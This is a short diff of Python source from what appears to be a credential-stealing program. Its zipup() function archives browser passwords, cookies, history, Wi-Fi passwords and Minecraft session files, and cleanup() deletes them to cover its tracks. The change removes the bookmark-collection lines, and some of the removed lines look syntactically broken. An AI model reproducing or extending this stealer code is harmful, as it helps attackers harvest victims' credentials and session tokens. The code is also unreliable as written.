@@ -549,11 +549,6 @@ def zipup():
             zipf.write("browser-passwords.txt")
             zipf.write("browser-cookies.txt")
             zipf.write("browser-history.txt")
-            if os.path.exists("browser-bookmarks.txt"):
-                zipf.write("browser-bookmarks.txt")
-            else:
-                pass
-            zipf.write("browser-bookmarks.json")
             zipf.write("wifi-passwords.txt")
             zipf.write("minecraft-sessioninfo.json")
             zipf.write("minecraft-usercache.json")
@@ -568,11 +563,6 @@ def cleanup():
         os.remove("browser-passwords.txt"),
         os.remove("browser-cookies.txt"),
         os.remove("browser-history.txt"),
-        os.remove("browser-bookmarks.json"),
-        if os.path.exists("browser-bookmarks.txt"):
-            os.remove("browser-bookmarks.txt")
-        else:
-            pass
         os.remove("wifi-passwords.txt"),
         os.remove("minecraft-usercache.json"),
         os.remove("minecraft-sessioninfo.json"),
